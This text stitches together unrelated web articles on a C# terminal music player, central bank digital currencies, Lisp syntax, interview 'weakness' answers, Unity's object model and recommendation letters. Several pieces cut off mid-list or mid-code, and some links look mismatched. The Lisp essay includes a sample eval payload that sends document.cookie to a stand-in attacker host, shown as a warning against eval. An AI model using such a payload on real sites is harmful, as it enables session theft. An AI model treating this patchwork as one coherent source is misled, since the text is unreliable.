<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" width="750" height="473" alt="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to check out <a href="https://github.com/naudio/NAudio/blob/master/Docs/PlayAudioFileWinForms.md" target="_blank">part two of this guide</a>, as we will refactor our current code and then implement some playback controls!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href=""><p>Central banks have overseen monetary policy for much of the last century. During that time, competition was scarce and innovation was slow.</p><p>But in the last decade, a three-pronged attack on the status quo has forced central banks to re-think their strategy.</p><p>It started when Bitcoin bypassed the entire global financial system with a digital, trustless payment network. It gave anyone the power to store, send and receive money across scale, space, and time.</p><p>Then, crypto stablecoins emerged as digital versions of fiat money on new payment rails, giving anyone with an internet connection access to their fiat currency of choice with no borders or transaction limits.</p><p>And in the last decade, a wave of digital-first financial apps like WeChat and Cash App have started to eat away at banking oligopolies, raising the bar for what people expect from their financial institutions.</p><p>In short, the entire global money supply chain is being disrupted, and nothing is exempt.</p><p>Not central banks, not local bank branches, not even the cash in your pocket.</p><p>In response, every segment of the traditional financial system is adapting. Banks are moving operations online and closing branches, merchants are improving online and in-person payment options, and central banks are studying digital currencies.</p><p>In this article we'll cover:</p><ul role="list"><li>What Central Bank Digital Currencies (CBDCs) are</li><li>Which countries are working on CBDCs</li><li>Why digital currencies are important tools for central banks</li><li>The impact CBDCs may have on commercial banks and physical cash</li><li>The challenges central banks need to overcome to implement a CBDC</li></ul><h2>What are Central Bank Digital Currencies?</h2><p>Central Bank Digital Currencies (CBDCs) are a digital extension of the cash in your pocket. There are a few important differences between CBDCs and cash, but 'digital cash' is a good starting point.</p><p>To understand what might make a 'digital cash' useful, let's start with the features that make cash useful. Because for decades, people all over the world have chosen cash as their preferred tool for buying and selling all sorts of goods and services. Why?</p><p>Cash has a few characteristics that make everyday payments possible:</p><ul role="list"><li>Everyone accepts it</li><li>It is hard to counterfeit</li><li>It can be exchanged directly (without involving a bank, payment processor, or government)</li><li>Settlement is instant and final (when I give you cash, all of it instantly becomes yours)</li><li>There are no minimum or maximum purchase amounts and no withholding periods</li></ul><p>But in addition to the features above, cash also has downsides for people and governments.</p><p>For people:</p><ul role="list"><li>It can't be spent online</li><li>It's awkward to store and manage coins and bills of all shapes and sizes</li><li>It's dirty (an especially significant concern thanks to COVID)</li><li>Holding large amounts of cash requires extra security</li></ul><p>For governments:</p><ul role="list"><li>It hides transactions and makes it hard to track down illegal purchases</li><li>It makes it harder to correctly account for and collect taxes</li><li>It's not an effective way to move large sums of money</li><li>It's not an effective way to send (or receive) money to (or from) millions of citizens</li></ul><p>Some of the disadvantages of cash can be easily solved with credit cards and wire transfers, but those are specialized (and expensive) financial tools with their own sets of problems. That's not the point of a CBDC.</p><p>At a high level, central bankers know that cash usage is declining, but they also know how important it is to a functioning economy. So they're trying to build a stable and versatile digital currency that is just as accessible as cash, without the physical constraints of coins and bills.</p><h2>Who is Working on CBDCs?</h2><p>A handful of central banks have already started working on CBDCs.</p><p>China was the first to act, possibly motivated by the prospect of achieving 'global reserve' currency status.</p><p>By launching a 'digital yuan' CBDC before the US launches a 'digital dollar' CBDC, China may be hoping to get other countries to trade in Yuan-denominated digital currency, rather than dollar-denominated money on traditional payment rails.</p><p>For a US economy that accounts for just 23% of global GDP, <a href="https://www.investopedia.com/articles/forex-currencies/092316/how-us-dollar-became-worlds-reserve-currency.asp#:~:text=Present%20Day-,Today%2C%20more%20than%2061%25%20of%20all%20foreign%20bank%20reserves%20are,debt%20is%20denominated%20in%20dollars.">61% of all foreign bank reserves</a> are currently denominated in U.S. dollars, and <a href="https://www.investopedia.com/articles/forex-currencies/092316/how-us-dollar-became-worlds-reserve-currency.asp#:~:text=Present%20Day-,Today%2C%20more%20than%2061%25%20of%20all%20foreign%20bank%20reserves%20are,debt%20is%20denominated%20in%20dollars.">40% of the world's debt</a> is denominated in dollars.</p><p>This 'dollarization of the world' has given America access to a massive pool of buyers for their debt, at lower rates than would be possible without being a 'reserve currency'.</p><p>Not an advantage the US wants to give up.</p><p>In 2015, The US Federal Reserve initially dismissed the idea of a digital currency, but has since changed their tune. They are actively researching the idea of a digital currency, along with a handful of other central banks around the world.</p><p>Below is a list of central banks that have made public statements about digital currencies, and the progress they've made so far.</p><h3>China</h3><ul role="list"><li><a

central banks released a paper titled <a href="https://www.bis.org/publ/othp33.pdf">'Central bank digital currencies: foundational principles and core features'</a>.</p><p>So far, it's the most complete CBDC plan central banks have released, and it's a common framework that they all worked together on.</p><p>Participants included the Bank of Canada, the ECB, the Bank of Japan, the Swedish Central Bank, the Swiss National Bank, the Bank of England, and the US Federal Reserve. It's worth noting that China did not collaborate on this report, and seems to be content building their own system.</p><p>The report above explains why central banks are studying digital currencies, and what a central bank digital currency might look like if it were to be implemented. It also emphasizes that none of the seven central banks are ready to implement a CBDC yet.</p><p>Below are some of the motivations, potential use cases, and challenges that were highlighted in the CBDC report.</p><h3>Opportunities for Central Bank Digital Currencies</h3><ul role="list"><li>Decreasing cash usage means some people (often the least wealthy) are left without access to 'risk-free' forms of payment</li><li>A CBDC could become a back-up payment method in extreme situations or remote locations where cash might not be accessible</li><li>A fragmented financial payment system with many competing 'closed-loop' participants (banks, credit cards, payment processors) could limit economic growth, a common CBDC could open up better payments access for all</li><li>A global CBDC framework could radically improve cross-border payments</li><li>Central banks could use a CBDC to instantly send stimulus money directly to citizens and governments could collect on taxes just as easily</li><li>Central banks could pay people interest on their CBDC holdings, just like a regular bank might have <a href="https://www.kevinrooke.com/post/your-bank-account-pays-negative-interest">(before they started paying negative interest rates)</a></li></ul><h3>Challenges for Central Bank Digital Currencies</h3><ul role="list"><li>How can central banks build a currency offering instant payments that is also hard to counterfeit, safe from cyber-attacks, and available at all times (including when the internet goes down)?</li><li>How will central banks make sure that technology-illiterate and low-income earners can onboard themselves to a completely digital system?</li><li>How will central banks convince people to trust a digital payments system that can track all of their transactions?</li><li>How will central banks create or connect an existing digital identity system to be sure that money is being sent to and received from the right people?</li><li>If central banks start paying people interest directly through a CBDC, will people ditch their bank accounts? Could this lead to runs on banks or other financial disruptions?</li><li>Could digital currencies undermine the effectiveness of foreign central bank monetary policy? Ex. If people in Sweden have access to digital dollars (a CBDC denominated in $USD), could Sweden's central bank lose its power to influence monetary …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>

<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>

<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>

	    	<p>When a hiring manager asks the weakness interview question, “What is your greatest weakness?” it’s best to be prepared with an answer. And a specific weakness in mind. This type of interview question is aimed at learning about a candidate’s core competencies in advance of hiring. Competencies are demonstrable characteristics and skills that improve a job's efficiency and effectiveness (or performance). These types of interview questions can help an employer predict the future job performance of a job candidate.</p>

<p>This common interview question comes in many forms. The interviewer may ask, “What is your biggest weakness?” or “What do you feel your greatest strength and weaknesses are?” When considering weaknesses to mention, it can be helpful to refer to a list of weaknesses that set examples for a potential answer. A job seeker should prepare to be asked this common interview question and prepare their answer with a real weakness they feel comfortable sharing.</p>

<p>This interview question is normally asked during the “on-site interview” portion of the interview process. It is less common for this question to be asked during the phone interview or pre-screen interview stage from a prospective employer. Regardless of the interview type, when there’s an upcoming interview, it is always suggested to prepare a “good answer” to this question and be ready to respond when asked this dreaded interview question.</p>

<p><img src="https://www.algrim.co/images/weaknesses-interview-question.jpg" alt="weaknesses interview question"></p>

<h2>Why "What Is Your Greatest Weakness" is Asked</h2>

<p>This interview question is asked to candidates to see how self-reflective they might be, how humble they might be, and if they have humility. The exercise aims to measure core competencies as well as the ability to be self-disciplined with their work.</p>

<p><strong>Tip:</strong> Keep seeing the phrase "core competencies?" Curious about what a core competency is? A core competency is a concept in management theory introduced by <a href="https://en.wikipedia.org/wiki/C._K._Prahalad">C. K. Prahalad</a> and <a href="https://en.wikipedia.org/wiki/Gary_Hamel">Gary Hamel</a>. It is defined as “a harmonized combination of multiple resources and skills that distinguish a firm in the marketplace.” And therefore, it is the foundation of a companies’ competitiveness.</p>

<p>When answering this interview question, the hiring manager doesn't care about what the candidate answers with, but how they answer it. The purpose of the exercise is for the employee to give themselves a small performance review.</p>

<p>According to <a href="https://www.bamboohr.com/hr-glossary/performance-review/">BambooHR</a>, "A performance review is a formal assessment in which a manager evaluates an employee's work performance, identifies strengths and weaknesses, offers feedback, and sets goals for future performance."</p>

<p>We can see from the interview question that it promotes the opportunity for the employee to be humble and identify a weakness that can be improved. When finding a weakness, use a weakness that is subtle. Rather, a strength that can be improved and not a weakness or missing talent.</p>

<p>For example, a great weakness would be <strong>patience</strong>. Since it is a strength, but can always be improved. Everyone can improve their patience. And patience will pay dividends for any business. It's a question that tests the candidate and shows whether or not they're a "good fit" for the business.</p>

<h2>Interview Question Answer Strategy</h2>

<p>The best strategy for answering this interview question is to answer with weaknesses that can also be considered strengths. Or another way to phrase it is to use a weakness that can be easily controlled or utilized in certain situations. Consider this a “good weakness.”</p>

<p>A poor weakness that does not do this is:</p>

<p>
I feel like I can get frustrated too easily.
</p>

<p>A good weakness that can be utilized as strength is:</p>

<p>
I can find myself having a hard time letting go of a project that I poured my heart into.
</p>

<p>This makes any weakness you describe an “acceptable” weakness to the interviewer or hiring manager. It also refers to a weakness that is presentable “on the job” rather than speaking about a personal weakness. For example, a personal weakness would be, “I feel like I get stressed out under pressure.” This is simply an irrelevant weakness to the hiring manager.</p>

<p>While many resources claim that referring to a <a href="https://www.algrim.co/879-skills-list-for-the-resume">soft skill</a> or hard skill through the interview answer is correct, it’s more effective to use a weakness that can be harnessed as a strength for the employer. There are two reasons for this. First, the interview answer will be more clear. Second, the story being told by the candidate will be shorter, and skill will still present itself to the hiring manager. The risk of using a story that describes a <a href="https://www.algrim.co/879-skills-list-for-the-resume">soft skill</a> is that it has the potential of mentioning a non-essential skill for the role. A clear, concise, and simple reference to the weakness should be sufficient.</p>

<p>When answering, the answer should take no more than 90-seconds to recite. If the interviewer asks to learn more about that weakness, be prepared to tell a short story that describes the flaw. The story should use a <a href="https://www.themuse.com/advice/star-interview-method">STAR response</a>. This is a situation, task, action, and result. Or another way to phrase it is that the answer should describe a mistake that embodies the weakness. Only use this method if the interviewer wants to learn more about the weakness.</p>

<p>Always use a previous job or current job as the basis for the answer. Never refer to a sporting team or extracurricular activity unless there is no prior work experience and relevant employment history to refer to. If possible, refer to methods for correcting the weakness at the moment or what might be done the next time the weakness presents itself in a work situation.</p>

<p>Job candidates should follow these answer strategy guidelines and best practices:</p>

<ul>
<li>Avoid using a personality trait or bad habit as a "weakness."</li>
<li>Provide a specific example or concrete example of the "weakness" in use.</li>
<li>Provide insight into how the weakness could be utilized in a "positive light" or used as a personal strength.</li>
<li>It's okay to mention a "weak spot" or "weak area" in professional life. Try to coordinate these areas as also being "core strengths." Meaning, the weakness is a strength, too.</li>
<li>If the weakness is influenced by "external factors" be sure to explain that to the hiring manager without the answer sounding like "blame."</li>
</ul>

<p><strong>Tip:</strong> Job candidates who are confused about how to answer this interview question should consider performing an "informational interview." An <a href="https://career.berkeley.edu/Info/InfoInterview">informational interview</a> is defined as an "informal conversation you can have with someone working in an area of interest to you. It is an effective research tool and is best done after preliminary online research.  It is not a job interview, and the objective is not to find job openings." Informational interviews can provide insight into company culture and requirements of jobs not listed on a job description. And can be useful in obtaining career advice from employed personnel.</p>

<h2>List of Weaknesses and Sample Answers</h2>

<p>Use these weaknesses and sample answers for a job interview. Be sure to answer with a genuine weakness that aligns with what the resume and cover letter may indicate. This job interview question is considered a “tough question” by the employer but one that displays personality and individuality to a potential employer. Spend time considering which weakness is most fitting and consider an appropriate response that's personal.</p>

<h3>1. I can be too detail-oriented.</h3>

<p>Sample answer: “I can find myself getting too heavily involved in the details of a project. While this is an indicator of my passion for the project, I can spend too much time focusing on the minor details and forget about the holistic needs of the team.”</p>

<h3>2. I can care a little too much about our customers.</h3>

<p>Sample answer: “At my previous job, I found myself using too much empathy. In certain circumstances, like in a nursing home, you have to distribute empathy equally. I found it difficult not to emotionally connect with a few patients.”</p>

<h3>3. I have a hard time saying “no.” </h3>

<p>Sample answer: “Saying no is really difficult for me. I like to make sure that our customers and team members are happy. Though, I recognize that if I say ‘Yes’ all the time, I might not be able to follow through with my promise. And this lets my team or customers down even more.”</p>

<h3>4. I have a hard time letting go of a project.</h3>

<p>Sample answer: “When I’ve spent a healthy amount of time and effort on a project, I have a hard time letting others get involved. At my previous job, there was a project I spent 12-months on. And when another team member came to take it over, I found it difficult not to periodically check in on the project and potentially micromanage.”</p>

<h3>5. I sometimes lack confidence.</h3>

<p>Sample answer: “When others ask my opinion, I struggle to present my thoughts and opinions even though I feel they are on target with what the company needs or the project needs. This is simply me not being able to ‘speak up’ for myself.”</p>

<h3>6. It can be difficult to maintain a healthy work/life balance.</h3>

<p>Sample answer: “When I get really passionate about a project, I can spend a little too much time on it and find myself getting a little burnt out. I need to remember that spending time away from a project is healthy.”</p>

<h3>7. I can find adaptability to be too comfortable.</h3>

<p>Sample answer: “I get concerned about the fact that I’m too comfortable with adaptability. Changing environments and the changing of hands. I’d like to think that stability is a good thing at times and is something I should be comfortable with as well.”</p>

<h3>8. I often find myself working too many hours and getting burnt out.</h3>

<p>Sample answer: “Some days I simply can’t put my work down. And I forget that I’m going to have to come back to work the next day. I might work late into the night and get incredibly passionate about a problem. I have to remember to pace myself and think clearly.”</p>

<h3>9. I have a hard time shifting from one project to another.</h3>

<p>Sample answer: “If I’m particularly passionate about one project, I can find it hard to shift into another …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We already discussed
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#gameobject">Game Objects</a> and
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#component">Components</a> as two
of the fundamental building blocks of the Unity Engine. Today, we’ll discuss
their programmatic representation.</p><p><em>This is <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>,
a series for folks familiar with software development best practices seeking an
accelerated introduction to Unity as an engine and editor. More is coming over
the next few weeks, so <a href="http://eepurl.com/gVgusL">consider subscribing</a> for
updates.</em></p><p>The Unity Engine <em>runtime</em> is primarily written in C++, and much of the Engine’s
primitives (such as the game objects and their components) live in C++ land.
You’ll also know that the Unity Engine <em>API</em> is in C#. The API gives you access
to all of Unity’s native objects in a way that<!-- -->—<!-- -->save for a few pitfalls
we’ll discuss today<!-- -->—<!-- -->feels like intuitive, idiomatic C#.</p><figure><p><img src="https://blog.eyas.sh/e1e4978ec3c78301c0c6b929c61f8bf7/object-hierarchy.svg" alt="A GameObject, MonoBehaviour, and ScriptableObject all inherit from UnityEngine Object."></p><figcaption><p>The <em>C#</em> class hierarchy of <code>UnityEngine.Object</code>, <code>GameObject</code>,
<code>ScriptableObject</code>, <code>Component</code>, and their children. This should map to the
<em>conceptual</em> hierarchy of how to think about these objects, though sometimes the
runtime implementation will look different.</p></figcaption></figure><h2 id="unityobject">UnityEngine.Object</h2><p>At the top of the Unity Object hierarchy sits <strong><code>UnityEngine.Object</code></strong>. For the
most part provides a <code>name</code> string, an <code>int GetInstanceID()</code> method, and a bunch
of equality comparers.</p><p>The class also provides a <code>static void Destroy(Object obj)</code> method (and some
overloads) that destroys a <code>UnityEngine.Object</code> and any of its subclasses. When
an Object is destroyed, the <em>native</em> part of the object is freed from memory,
and the smaller <em>managed</em> part will be garbage collected <em>at some point</em> after
there are no more references to it.</p><p>Because your valid reference to a <code>UnityEngine.Object</code> can point to a destroyed
native object, <code>UnityEngine.Object</code> overrides C#‘s <code>operator==</code> and <code>operator!=</code>
to make a destroyed Object <em>appear</em> null. Simply accessing methods on a
destroyed object will return <code>NullReferenceException</code>, albeit with a friendlier
error message that tells you which object you were trying to access.</p><h2 id="gameobject">GameObject</h2><p>A <strong>GameObject</strong> derives from Object and represents anything in your scene.</p><p>Let’s start at a high-level: A GameObject inherits a name and instance ID from
its parent. Otherwise, conceptually, a GameObject</p><ul><li>has a list of <a href="#component"><strong>Components</strong></a> on it,</li><li>has a <code>tag</code> string for organizational purposes, and</li><li>belongs to a <a href="https://docs.unity3d.com/Manual/Layers.html">layer</a>.</li></ul><p>A GameObject’s state</p><ul><li>is the product of all of its <em>Components’</em> state, and</li><li>whether an object is active or not.</li></ul><p>Let’s dig a bit deeper. When starting, most of the interesting stuff in a
GameObject is in its <strong>Components</strong>. A GameObject has at least one Component:
its <a href="https://docs.unity3d.com/ScriptReference/Transform.html"><code>Transform</code></a>. A
Transform describes the position and rotation of the GameObject. A Transform
includes helper properties that show an object’s <em>absolute world</em> position and
rotation, as well as the position and rotation <em>relative</em> to its parent. In the
Editor, the Transform position and rotation are set from the <em>parent relative</em>
variants.</p><p>Since every GameObject has a Transform (and also, given that a Transform is
frequently needed/accessed), the GameObject directly exposes a
<code>Transform transform</code> public property.</p><p>You can access individual components from <code>T GetComponent&lt;T&gt;()</code>, or lists of
components from <code>T[] GetComponents&lt;T&gt;()</code>, etc. These methods search through all
components on a GameObject and return ones with a compatible type (or null, if
none exist in the singular case). Since these methods search through components
and check type compatibility, it is often recommended to cache this lookup.</p><p>If you are building/extending a GameObject by hand, you can always use
<code>T AddComponent&lt;T&gt;()</code>. In most cases, however, you’re better off using the
Editor.</p><p>Individual Objects (a Component or ScriptableObject) might refer to other
<code>GameObjects</code> in a few ways:</p><ul><li><p><strong>By reference</strong>. By exposing a <code>GameObject</code> <em>serialized field</em> that you
then set from the inspector.</p><p><em>We have discussed serialization extensively throughout the series:
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#serialization">as a fundamental concept</a>
and in our tour of the Editor, when
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt4-editor-tour#inspector">describing the Inspector</a>,
and the <a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt2-six-practices">practice</a> of using
the Inspector as an injection framework</em>.</p></li><li><p><strong>Using tags</strong>. Every Game Object can have a <em>tag</em> string. You can find
objects in the scene using that tag through the static functions
<code>GameObject.FindGameObjectsWithTag</code> and <code>GameObject.FindGameObjectWithTag</code>.
A GameObject also exposes a public <code>bool CompareTag(string tag)</code> method.</p><p>This is a quick-and-dirty way to get the job done, but is still a popular
way. A common use of this in the wild is to have a <code>"Player"</code> tag to find
the Player. Ideally, these methods should not be called every frame, so if
you have to use them, consider caching the result.</p></li><li><p><strong>Using layers</strong>. A layer is an <code>int</code> between 0 and 31. Every Game Object is
in exactly one layer.</p><p>While you can’t directly look up all objects in a layer, if you already have
a reference to a GameObject (e.g., in a collision event), you can check a
GameObject against a
<a href="https://docs.unity3d.com/ScriptReference/LayerMask.html"><code>LayerMask</code></a>. A
<code>LayerMask</code> is typically used in functions like <code>Physics.Raycast()</code>. This
allows you to find objects with colliders intersecting with a given <em>ray</em>.
Passing a <code>LayerMask</code> to <code>Physics.Raycast()</code> will only return objects within
the specified set of layers.</p><p>Inside the Unity Engine, <em>Cameras</em> make heavy use of layers. E.g., you can
have one camera that renders “everything but UI”, and overlay another camera
for an in-game HUD, etc.</p></li><li><p><strong>Using indirect references</strong>. There are many reasons why the methods above
might be insufficient: you might not want to use tags to avoid depending on
copy-pasted strings, and layers might not fit your use case. If referencing
a fellow object in-scene is not an option (e.g., you’re dealing with a
dynamic set of objects or don’t have access to the current scene objects in
the context you need this reference, etc.), then you might want to look
further.</p><p>For this, an increasingly popular concept is <em>runtime sets</em> Scriptable
Objects. You can read more about this in Unity’s how-to article on
<a href="https://unity.com/how-to/architect-game-code-scriptable-objects">architecting your game with ScriptableObjects</a>,
based on <a href="https://www.youtube.com/watch?v=raQ3iHhE_Kk">the talk</a> by Ryan
Hipple. If you have an hour to spare, you might want to watch the whole
thing.</p></li></ul><p>A GameObject also exposes a <code>BroadcastMessage</code> and <code>SendMessage</code> functions that
propagate <em>messages</em> (described in the <a href="#component"><strong>Component</strong></a> section) to
all components in or under it.</p><figure><p><span>

User-implemented Components will usually extend the <code>MonoBehaviour</code> subclass
(more on that later).</p><p>A Component inherits a name and instance ID from its parent. Otherwise,
conceptually, a Component</p><ul><li>always <em>belongs</em> to a single GameObject, exposed as a public
<code>GameObject gameObject</code> property, and</li><li>can receive <strong>messages</strong>, driving much of its behavior.</li></ul><p>The state of a component on an <em>active</em> GameObject lies entirely in its
implementation.</p><p>In addition to its <code>GameObject</code>, a component exposes shorthand properties and
methods such as <code>Transform transform</code>, <code>T GetComponent&lt;T&gt;()</code>, etc. These are
simply convenience shorthands for accessing those same methods on the
corresponding <code>gameObject</code>.</p><p>The most important functionality of a Component is driven through <strong>Unity
Messages</strong> (also sometimes called <em>Unity Event Functions</em> when referring to
built-in messages). These are effectively callbacks functions triggered <em>by the
Engine</em> in certain situations. Every Component will receive a <code>Awake()</code>,
<code>Start()</code>, <code>Update()</code> and other messages, for example. The Unity Docs on the
<a href="https://docs.unity3d.com/Manual/ExecutionOrder.html">Order of Execution</a> of
these messages is a convenient resource.</p><p>To have your component receive a particular message, simply add a
<em><code>private void</code></em> method with the appropriate message name. The runtime will use
reflection to call these messages, when applicable. This is why you don’t see an
<code>override</code> directive on these messages. Messages like <code>Update</code>, <code>LateUpdate</code>,
and <code>FixedUpdate</code> are inspected once per type, so don’t worry about reflection
being used in every frame. See more details in the
”<a href="https://blogs.unity3d.com/2015/12/23/1k-update-calls/">10000 Update() calls</a>”
Unity blog post for more information.</p><p>A <strong><code>Behaviour</code></strong> is a type of component that <em>can be enabled or disabled</em>. When
a <code>Behaviour</code> is disabled, <code>Start</code>, <code>Update</code>, <code>FixedUpdate</code>, <code>LateUpdate</code>,
<code>OnEnable</code>, and <code>OnDisable</code> messages are not called.</p><p>A <strong><code>MonoBehaviour</code></strong> is a <code>Behaviour</code> that also enables using
<a href="https://docs.unity3d.com/Manual/Coroutines.html">Coroutines</a>.</p><h2>A Note on Inactive Objects and Disabled Components</h2><p>A GameObject in a loaded scene will exist in memory until the object is
<em>Destroyed</em> explicitly or the scene is unloaded. A GameObject can be set to
<em>inactive</em>, which will cause it to stop receiving <code>Update</code> (and related) events.</p><p><strong>When an object is <em>created</em></strong>, the messages called on a component depend on
if: (1) the GameObject is active, and (2) the component is enabled:</p><table><thead><tr><th></th><th>GameObject is <em>active</em></th><th>GameObject is <em>inactive</em></th></tr></thead><tbody><tr><td>Component is Enabled</td><td><code>Awake</code>, <code>OnEnable</code>, <code>Start</code></td><td><em>Component implicitly disabled</em></td></tr><tr><td>Component is Disabled</td><td><code>Awake</code></td><td><code>Awake</code></td></tr></tbody></table><p><strong>When an object is <em>set to active</em> or a <code>Behaviour</code> is <em>set to enabled</em></strong>:</p><ul><li><code>OnEnable</code> will be called.</li><li>If <code>Start</code> has never been called on this <code>Behaviour</code>, it will be called
exactly once.</li></ul><h2 id="takeaways">Takeaways</h2><p>Some takeaways of all this:</p><ol><li>A Unity object might <em>appear to become <code>null</code></em> when destroyed. <code>== null</code>
checking does more than you think.</li><li>As a result, null-coalescing operators (<code>??</code>, <code>??=</code>) and null-conditional
operators (<code>?.</code>, <code>?[]</code>) don’t work as expected.</li><li>Yes, your Unity Messages can be private!</li><li>Don’t create abstract classes that unnecessarily declare <code>Update</code> or other
messages to make overriding easier; that’ll result in the engine always
calling these events.</li><li>Disabling an Object or Component is a great way to limit its game logic or
save on CPU-bound effort, but these objects still have a memory overhead.</li></ol></div></div>]]>

	    	<p>As a resigning employee, asking for a letter of recommendation (or sometimes referred to as a reference letter) from a current employer, colleague, supervisor, manager, or boss can be a great way to collect a helpful job application asset for the future. When leaving on good terms with a company, this provides the employer with a desire to write a strong letter and overall positive recommendation for future employment purposes.</p>

<p>Asking for a recommendation letter is a fairly simple process. It involves showing gratitude to the letter writer for their future efforts, providing the writer with goals or objectives for the letter, and setting a deadline for when the letter is required (helpful for medical school and college application purposes).</p>

<p>In most cases, recommendation letters are requested for professional purposes, which alleviates the need to punctuate a deadline. When applying for an MBA program or other graduate school (sometimes referred to as “grad school”) needs, for example, providing the writer with the application deadline and application materials (like the application itself) can be useful.</p>

<p><img src="https://www.algrim.co/images/how-to-ask-for-a-letter-of-recommendation.jpg" alt="how to ask for a letter of recommendation"></p>

<p><strong>Tip:</strong> To receive a “glowing letter of recommendation”, provide the letter writer with a few guidelines. Always address the reader by name in the greeting, use the <a href="https://www.canr.msu.edu/news/challenge_action_result_car_statements_part_1">CAR format</a> (Challenge/Action/Results) and reference facts of the applicant versus subjective claims.</p>

<p>When asking the recommendation writer to provide insights into the letter. Here are some examples:</p>

<ul>
<li>Including test scores and school projects that admissions officers might appreciate.</li>
<li>Including an extracurricular activity that showed leadership, promise, or drive.</li>
<li>Previous employment experiences that show competencies, skills, and teamwork.</li>
</ul>

<p>Depending on the type of recommendation request, these would be helpful guidelines to send to the recommendation writer for what the letter should contain.</p>

<p><strong>Tip:</strong> Collecting multiple letters from professional references can be helpful for any job seeker.</p>

<p>Here are professionals who may be able to write a recommendation letter:</p>

<ul>
<li>A pastor or minister.</li>
<li>A close family acquaintance.</li>
<li>A previous manager, boss, or supervisor.</li>
<li>A counselor or guidance counselor.</li>
<li>A professor, teacher, or faculty member.</li>
</ul>

